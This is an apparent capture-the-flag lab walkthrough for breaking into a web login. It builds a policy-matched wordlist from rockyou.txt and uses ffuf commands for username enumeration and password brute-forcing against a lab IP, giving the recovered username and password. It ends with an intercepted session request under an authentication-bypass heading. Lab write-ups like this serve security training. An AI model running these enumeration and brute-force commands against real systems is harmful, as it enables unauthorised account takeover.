**Obtain the flag

Register an account.
Password policy:
- at least one digit
- at least one lower
- at least one upper
- no special chars
- exactly 12
```
grep -E '^[A-Za-z0-9]{12}$' rockyou.txt \
  | grep '[A-Z]' \
  | grep '[a-z]' \
  | grep '[0-9]' \
  > custom_wordlist.txt
```

Enumerate users
```
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://83.136.250.108:30803/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown username or password."
```
- gladys

Bruteforce passwords
```
ffuf -w ./custom_wordlist.txt -u http://83.136.250.108:30803/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials."
```
- dWinaldasD13

Authentication bypass
- Intercept request with Burp Suite
```
GET /profile.php HTTP/1.1
Host: 83.136.250.108:30803
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=q0qoqq6eetn7t15utvt008k2qr
Connection: keep-alive

```
